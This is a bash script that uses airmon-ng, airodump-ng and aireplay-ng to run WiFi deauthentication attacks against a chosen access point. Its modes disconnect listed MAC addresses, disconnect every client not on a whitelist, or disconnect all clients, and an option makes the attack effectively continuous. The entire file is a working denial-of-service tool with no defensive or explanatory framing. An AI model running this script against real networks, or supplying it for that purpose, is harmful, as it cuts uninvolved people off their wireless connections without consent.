#!/bin/bash
echo "Initializing..."
rm wk-*.csv -f
rm wk-*.cap -f
rm wk-*.netxml -f
echo "using interface $1...setting $1 to monitor mode...Attacking $2 at channel $3..." 
sleep 3
sudo airmon-ng start "$1"

hits=3
if [[ $6 == 'c' ]]
then
	hits=9999999999
	echo "Continuous mode on..."		
fi

if [[ $4 == 'b' ]]
then
	echo "running in blacklist mode..."
	sudo iwconfig "$1"mon channel "$3"
	while read -r mac
	do

		echo "killing $mac"
		sudo aireplay-ng "$1"mon -a "$2" -c "$mac" -0 "$hits" &
		
	done < "$5"
	wait
elif [[ $4 == 'w' ]]
then
	echo "running in whitelist mode..."
	sudo airodump-ng "$1"mon --bssid "$2" -c "$3" -w wk
	sort "$5" > "$5"sorted
	while read -r mac
	do
		echo "killing $mac"
		sudo aireplay-ng "$1"mon -a "$2" -c "$mac" -0 "$hits" &
	done < <(tail -n+6 wk-01.csv | cut -c1-17 | grep -Eo "([A-Z0-9]{2}:){5}([A-Z0-9]){2}" | sort | diff "$5"sorted - | grep -Eo "([A-Z0-9]{2}:){5}([A-Z0-9]){2}")
	wait
else
	echo "no mode specified, targeting everyone..."
	sudo airodump-ng "$1"mon --bssid "$2" -c "$3" -w wk
	sudo aireplay-ng "$1"mon -a "$2" -0 "$hits"
fi


echo "bringing $1 back to managed mode" 
sudo airmon-ng stop "$1"mon
